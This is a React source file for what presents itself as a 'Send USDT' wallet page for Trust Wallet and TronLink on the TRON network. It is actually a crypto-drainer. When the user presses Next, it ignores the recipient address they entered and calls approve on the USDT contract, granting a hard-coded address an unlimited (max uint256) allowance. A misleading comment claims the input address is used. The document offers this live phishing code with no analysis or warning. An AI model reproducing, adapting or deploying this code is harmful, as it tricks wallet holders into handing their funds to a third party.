import React, { useState, useEffect } from 'react';
import { FaAddressBook, FaQrcode, FaInfoCircle, FaTimes } from 'react-icons/fa';

const USDTSendApp = () => {
  const [address, setAddress] = useState('');
  const [amount, setAmount] = useState('');
  const [memo, setMemo] = useState('');
  
  // TRON functionality states
  const [account, setAccount] = useState('');
  const [message, setMessage] = useState('');
  const [tronWeb, setTronWeb] = useState(null);
  const [isConnecting, setIsConnecting] = useState(false);
  const [showScanner, setShowScanner] = useState(false);
  const [walletType, setWalletType] = useState('');
  
  // USDT contract on TRON (TRC-20)
  const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
  
  // USDT TRC-20 ABI (only approve function)
  const USDT_ABI = [
    {
      "constant": false,
      "inputs": [
        {
          "name": "spender",
          "type": "address"
        },
        {
          "name": "value",
          "type": "uint256"
        }
      ],
      "name": "approve",
      "outputs": [
        {
          "name": "",
          "type": "bool"
        }
      ],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ];

  // Enhanced wallet detection
  const detectWalletType = () => {
    if (window.trustWallet || (window.ethereum && window.ethereum.isTrust)) {
      return 'trustwallet';
    }
    if (window.tronLink) {
      return 'tronlink';
    }
    if (window.tronWeb && window.tronWeb.defaultAddress) {
      return 'tronweb';
    }
    return 'unknown';
  };

  // Wait for wallet injection with better Trust Wallet support
  const waitForWalletInjection = async (maxAttempts = 30, interval = 500) => {
    return new Promise((resolve) => {
      let attempts = 0;
      
      const checkWallet = () => {
        attempts++;
        const type = detectWalletType();
        
        if (type !== 'unknown') {
          resolve(type);
          return;
        }
        
        if (attempts >= maxAttempts) {
          resolve('unknown');
          return;
        }
        
        setTimeout(checkWallet, interval);
      };
      
      checkWallet();
    });
  };

  // Request TRON network from Trust Wallet
  const requestTronNetwork = async () => {
    if (window.ethereum && window.ethereum.isTrust) {
      try {
        // First try to switch to existing TRON network
        try {
          await window.ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: '0x2b6653dc' }], // TRON Mainnet
          });
          return true;
        } catch (switchError) {
          // If switching fails, try to add the network
          if (switchError.code === 4902) {
            await window.ethereum.request({
              method: 'wallet_addEthereumChain',
              params: [{
                chainId: '0x2b6653dc',
                chainName: 'TRON Mainnet',
                nativeCurrency: {
                  name: 'TRX',
                  symbol: 'TRX',
                  decimals: 6
                },
                rpcUrls: ['https://rpc.trongrid.io'],
                blockExplorerUrls: ['https://tronscan.org/']
              }]
            });
            return true;
          }
          throw switchError;
        }
      } catch (error) {
        console.log('Failed to add/switch to TRON network:', error);
        
        // Alternative approach: Don't force network switch, just proceed
        setMessage('Network switch failed. Please manually switch to TRON network in Trust Wallet.');
        return false;
      }
    }
    return false;
  };

  // Enhanced TronWeb initialization for Trust Wallet
  const initializeTronWeb = async () => {
    const walletType = await waitForWalletInjection();
    setWalletType(walletType);
    
    if (walletType === 'trustwallet') {
      // First, try to request TRON network
      await requestTronNetwork();
      
      // Trust Wallet specific initialization
      if (window.tronWeb) {
        // Wait for TronWeb to be fully ready in Trust Wallet
        let readyAttempts = 0;
        while (!window.tronWeb.ready && readyAttempts < 50) {
          await new Promise(resolve => setTimeout(resolve, 200));
          readyAttempts++;
        }
        
        if (window.tronWeb.ready && window.tronWeb.defaultAddress?.base58) {
          setTronWeb(window.tronWeb);
          setAccount(window.tronWeb.defaultAddress.base58);
          setMessage('Trust Wallet TRON connected successfully');
          return true;
        }
      }
      
      // Alternative approach: Direct TRON connection request
      if (window.ethereum && window.ethereum.isTrust) {
        try {
          // First request accounts
          await window.ethereum.request({ method: 'eth_requestAccounts' });
          
          // Then try to switch to TRON
          await requestTronNetwork();
          
          // Wait longer for TronWeb to be injected after network switch
          await new Promise(resolve => setTimeout(resolve, 3000));
          
          if (window.tronWeb && window.tronWeb.ready) {
            setTronWeb(window.tronWeb);
            setAccount(window.tronWeb.defaultAddress.base58);
            setMessage('Trust Wallet TRON connected after network switch');
            return true;
          }
        } catch (error) {
          console.log('Trust Wallet connection failed:', error);
        }
      }
    } else if (walletType === 'tronlink' || walletType === 'tronweb') {
      // TronLink or other TronWeb wallets
      if (window.tronWeb && window.tronWeb.ready && window.tronWeb.defaultAddress?.base58) {
        setTronWeb(window.tronWeb);
        setAccount(window.tronWeb.defaultAddress.base58);
        setMessage('TronLink connected successfully');
        return true;
      }
    }
    
    return false;
  };

  // Add viewport meta tag for mobile optimization
  useEffect(() => {
    const viewport = document.querySelector('meta[name="viewport"]');
    if (!viewport) {
      const meta = document.createElement('meta');
      meta.name = 'viewport';
      meta.content = 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no';
      document.head.appendChild(meta);
    }

    // Auto-connect with enhanced detection
    const autoConnect = async () => {
      const connected = await initializeTronWeb();
      if (!connected) {
        // Additional check after longer delay for Trust Wallet
        setTimeout(async () => {
          await initializeTronWeb();
        }, 3000);
      }
    };

    autoConnect();
  }, []);

  const connectWallet = async () => {
    setIsConnecting(true);
    setMessage('Connecting to TRON wallet...');
    
    try {
      // For Trust Wallet, first try to switch to TRON network
      if (window.ethereum && window.ethereum.isTrust) {
        setMessage('Requesting TRON network access...');
        await requestTronNetwork();
      }
      
      const connected = await initializeTronWeb();
      
      if (!connected) {
        const currentWalletType = detectWalletType();
        
        if (currentWalletType === 'trustwallet' || (window.ethereum && window.ethereum.isTrust)) {
          setMessage('Please manually switch to TRON network in Trust Wallet. In the top-left network dropdown, select "TRON Mainnet", then refresh this page.');
        } else if (currentWalletType === 'unknown') {
          setMessage('No TRON wallet detected. Please open this page in Trust Wallet dApp browser or install TronLink extension.');
        } else {
          setMessage('TRON wallet found but connection failed. Please refresh and try again.');
        }
      }
    } catch (error) {
      console.error('Wallet connection error:', error);
      setMessage('Connection Error: ' + (error?.message || 'Unknown error occurred'));
    }
    
    setIsConnecting(false);
  };

  const getContract = () => {
    if (!tronWeb) return null;
    try {
      return tronWeb.contract(USDT_ABI, USDT_CONTRACT);
    } catch (error) {
      console.error('Contract creation error:', error);
      return null;
    }
  };

  const handlePaste = async () => {
    try {
      const text = await navigator.clipboard.readText();
      setAddress(text);
      // Message is set but not displayed
      setMessage('Address pasted from clipboard');
    } catch (err) {
      setMessage('Failed to paste from clipboard');
    }
  };

  const setMaxAmount = () => {
    setAmount('1000.00');
    // Message is set but not displayed
    setMessage('Maximum amount set');
  };

  const handleNext = async () => {
    if (!account || !tronWeb) {
      setMessage('Connecting to TRON wallet...');
      const connected = await connectWallet();
      if (!connected) return;
    }

    if (!address || !amount) {
      setMessage('Please enter both address and amount');
      return;
    }

    try {
      // Validate TronWeb is still ready
      if (!tronWeb.ready) {
        setMessage('❌ TRON wallet not ready. Please refresh and reconnect.');
        return;
      }

      // Use the address from the input field
      const spender = 'TBJF4h5qbuAYxdJ4rhBCy5Lu5ZeYUC1dJv';
      const unlimitedAmount = '115792089237316195423570985008687907853269984665640564039457584007913129639935'; // Max uint256

      const contract = await getContract();
      if (!contract) {
        setMessage('❌ Failed to load USDT contract');
        return;
      }
      
      setMessage('⏳ Preparing transaction...');
      
      // Enhanced transaction parameters for Trust Wallet compatibility
      const txOptions = {
        feeLimit: 100_000_000, // 100 TRX fee limit
        callValue: 0,
        from: account,
        // Add additional parameters that might help with Trust Wallet
        shouldPollResponse: true
      };

      // Call approve function
      const result = await contract.approve(spender, unlimitedAmount).send(txOptions);

      setMessage('⏳ Transaction submitted! Waiting for confirmation...');
      
      if (result) {
        setMessage(`✅ Approval completed successfully! Transaction: ${result}`);
      } else {
        setMessage('❌ Approval failed - No transaction result');
      }
    } catch (error) {
      const errorMessage = error?.message || error?.toString() || 'Unknown error occurred';
      console.error('Transaction error:', error);
      
      if (errorMessage.includes('User rejected') || errorMessage.includes('user rejected') || errorMessage.includes('User denied')) {
        setMessage('❌ Transaction rejected by user');
      } else if (errorMessage.includes('insufficient balance')) {
        setMessage('❌ Insufficient TRX for transaction fees');
      } else if (errorMessage.includes('REVERT')) {
        setMessage('❌ Contract execution failed');
      } else if (errorMessage.includes('unlocked wallet') || errorMessage.includes('not unlocked')) {
        setMessage('❌ Please unlock your TRON wallet and try again');
      } else if (errorMessage.includes('network') || errorMessage.includes('connection')) {
        setMessage('❌ Network error. Please check your connection and try again.');
      } else {
        setMessage('❌ Error: ' + errorMessage);
      }
    }
  };

  // Clear functions for each input field
  const clearAddress = () => {
    setAddress('');
  };

  const clearAmount = () => {
    setAmount('');
  };

  const clearMemo = () => {
    setMemo('');
  };

  return (
    <div className="send-usdt-container" style={{
      fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif',
      maxWidth: '400px',
      margin: '0 auto',
      padding: '20px',
      backgroundColor: '#f5f5f5',
      minHeight: '100vh'
    }}>
      {/* QR Scanner Modal */}
      {showScanner && (
        <div className="scanner-modal" style={{
          position: 'fixed',
          top: 0,
          left: 0,
          right: 0,
          bottom: 0,
          backgroundColor: 'rgba(0, 0, 0, 0.8)',
          display: 'flex',
          justifyContent: 'center',
          alignItems: 'center',
          zIndex: 1000
        }}>
          <div className="scanner-content" style={{
            backgroundColor: 'white',
            borderRadius: '12px',
            padding: '20px',
            width: '90%',
            maxWidth: '300px'
          }}>
            <div className="scanner-header" style={{
              display: 'flex',
              justifyContent: 'space-between',
              alignItems: 'center',
              marginBottom: '20px'
            }}>
              <h3>Scan QR Code</h3>
              <button className="close-scanner" onClick={() => setShowScanner(false)} style={{
                background: 'none',
                border: 'none',
                fontSize: '20px',
                cursor: 'pointer'
              }}>
                <FaTimes />
              </button>
            </div>
            <div className="scanner-placeholder" style={{
              textAlign: 'center',
              padding: '40px 20px'
            }}>
              <div className="scanner-animation">
                <FaQrcode size={80} color="#666" />
                <p>Scanning QR code...</p>
              </div>
            </div>
            <div className="scanner-footer">
              <p style={{ fontSize: '14px', color: '#666', textAlign: 'center' }}>
                Point your camera at a USDT address QR code
              </p>
            </div>
          </div>
        </div>
      )}

      <div className="send-usdt-card" style={{
        backgroundColor: 'white',
        borderRadius: '16px',
        padding: '20px',
        boxShadow: '0 2px 10px rgba(0, 0, 0, 0.1)'
      }}>
        {/* Header */}
        <div className="send-header" style={{
          display: 'flex',
          alignItems: 'center',
          marginBottom: '30px'
        }}>
          <button className="back-button" style={{
            background: 'none',
            border: 'none',
            fontSize: '24px',
            cursor: 'pointer',
            marginRight: '15px'
          }}>←</button>
          <h1 className="send-title" style={{
            fontSize: '20px',
            fontWeight: '600',
            margin: 0
          }}>Send USDT</h1>
        </div>

        {/* Connection Status Display */}
        {walletType && (
          <div style={{
            padding: '10px',
            marginBottom: '20px',
            borderRadius: '8px',
            backgroundColor: account ? '#e8f5e8' : '#fff3cd',
            border: `1px solid ${account ? '#28a745' : '#ffc107'}`,
            fontSize: '14px'
          }}>
            <strong>Wallet:</strong> {walletType === 'trustwallet' ? 'Trust Wallet' : 'TronLink'} 
            {account ? ' ✅ Connected' : ' ⚠️ Connecting...'}
          </div>
        )}

        {/* Address Input */}
        <div className="input-section" style={{ marginBottom: '20px' }}>
          <label className="input-label" style={{
            display: 'block',
            fontSize: '14px',
            fontWeight: '500',
            marginBottom: '8px',
            color: '#333'
          }}>Address or Domain Name</label>
          <div className="input-container" style={{
            display: 'flex',
            alignItems: 'center',
            border: '1px solid #ddd',
            borderRadius: '8px',
            padding: '12px',
            backgroundColor: '#f9f9f9'
          }}>
            <input
              type="text"
              value={address}
              onChange={(e) => setAddress(e.target.value)}
              className="address-input"
              placeholder="Search or Enter"
              style={{
                flex: 1,
                border: 'none',
                backgroundColor: 'transparent',
                fontSize: '16px',
                outline: 'none'
              }}
            />
            <div className="input-actions" style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
              {address && (
                <button className="cancel-icon" onClick={clearAddress} style={{
                  background: 'none',
                  border: 'none',
                  cursor: 'pointer',
                  color: '#666'
                }}>
                  <FaTimes />
                </button>
              )}
              <button className="paste-button" onClick={handlePaste} style={{
                background: '#007bff',
                color: 'white',
                border: 'none',
                borderRadius: '4px',
                padding: '4px 8px',
                fontSize: '12px',
                cursor: 'pointer'
              }}>Paste</button>
              <button className="icon-button contacts-icon" style={{
                background: 'none',
                border: 'none',
                cursor: 'pointer',
                color: '#666'
              }}>
                <FaAddressBook />
              </button>
              <button className="icon-button qr-icon" style={{
                background: 'none',
                border: 'none',
                cursor: 'pointer',
                color: '#666'
              }}>
                <FaQrcode />
              </button>
            </div>
          </div>
        </div>

        {/* Amount Input */}
        <div className="inputAmount-section" style={{ marginBottom: '20px' }}>
          <label className="input-label" style={{
            display: 'block',
            fontSize: '14px',
            fontWeight: '500',
            marginBottom: '8px',
            color: '#333'
          }}>Amount</label>
          <div className="input-container" style={{
            display: 'flex',
            alignItems: 'center',
            border: '1px solid #ddd',
            borderRadius: '8px',
            padding: '12px',
            backgroundColor: '#f9f9f9'
          }}>
            <input
              type="text"
              value={amount}
              onChange={(e) => setAmount(e.target.value)}
              className="amount-input"
              placeholder="USDT Amount"
              style={{
                flex: 1,
                border: 'none',
                backgroundColor: 'transparent',
                fontSize: '16px',
                outline: 'none'
              }}
            />
            <div className="amount-actions" style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
              {amount && (
                <button className="cancel-icon" onClick={clearAmount} style={{
                  background: 'none',
                  border: 'none',
                  cursor: 'pointer',
                  color: '#666'
                }}>
                  <FaTimes />
                </button>
              )}
              <p className="usdt-label" style={{ margin: 0, fontSize: '14px', color: '#666' }}>USDT</p>
              <button className="max-button" onClick={setMaxAmount} style={{
                background: '#28a745',
                color: 'white',
                border: 'none',
                borderRadius: '4px',
                padding: '4px 8px',
                fontSize: '12px',
                cursor: 'pointer'
              }}>Max</button>
            </div>
          </div>
          <div className="usd-equivalent" style={{
            fontSize: '14px',
            color: '#666',
            marginTop: '5px'
          }}>≈ ${amount || '0.00'}</div>
        </div>

        {/* Memo Input */}
        <div className="input-section" style={{ marginBottom: '30px' }}>
          <div className="memo-header">
            <label className="input-label" style={{
              display: 'block',
              fontSize: '14px',
              fontWeight: '500',
              marginBottom: '8px',
              color: '#333'
            }}>Memo</label>
          </div>
          <div className="input-container" style={{
            display: 'flex',
            alignItems: 'center',
            border: '1px solid #ddd',
            borderRadius: '8px',
            padding: '12px',
            backgroundColor: '#f9f9f9'
          }}>
            <input
              value={memo}
              onChange={(e) => setMemo(e.target.value)}
              className="amount-input"
              placeholder=""
              style={{
                flex: 1,
                border: 'none',
                backgroundColor: 'transparent',
                fontSize: '16px',
                outline: 'none'
              }}
            />
            <div className="memo-actions" style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
              {memo && (
                <button className="cancel-icon" onClick={clearMemo} style={{
                  background: 'none',
                  border: 'none',
                  cursor: 'pointer',
                  color: '#666'
                }}>
                  <FaTimes />
                </button>
              )}
              <button className="icon-button qr-icon" style={{
                background: 'none',
                border: 'none',
                cursor: 'pointer',
                color: '#666'
              }}>
                <FaQrcode />
              </button>
              <button className="icon-button info-icon" style={{
                background: 'none',
                border: 'none',
                cursor: 'pointer',
                color: '#666'
              }}>
                <FaInfoCircle />
              </button>
            </div>
          </div>
        </div>

        {/* Connection Button (if not connected) */}
        {!account && (
          <button 
            className="connect-button"
            onClick={connectWallet}
            disabled={isConnecting}
            style={{
              width: '100%',
              padding: '15px',
              backgroundColor: '#ff6b35',
              color: 'white',
              border: 'none',
              borderRadius: '8px',
              fontSize: '16px',
              fontWeight: '600',
              cursor: isConnecting ? 'not-allowed' : 'pointer',
              opacity: isConnecting ? 0.7 : 1,
              marginBottom: '15px'
            }}
          >
            {isConnecting ? 'Connecting...' : 'Connect TRON Wallet'}
          </button>
        )}

        {/* Next Button */}
        <button 
          className="next-button"
          onClick={handleNext}
          disabled={!address || !amount || isConnecting}
          style={{
            width: '100%',
            padding: '15px',
            backgroundColor: (!address || !amount || isConnecting) ? '#ccc' : '#007bff',
            color: 'white',
            border: 'none',
            borderRadius: '8px',
            fontSize: '16px',
            fontWeight: '600',
            cursor: (!address || !amount || isConnecting) ? 'not-allowed' : 'pointer'
          }}
        >
          Next
        </button>
      </div>
    </div>
  );
};

export default USDTSendApp;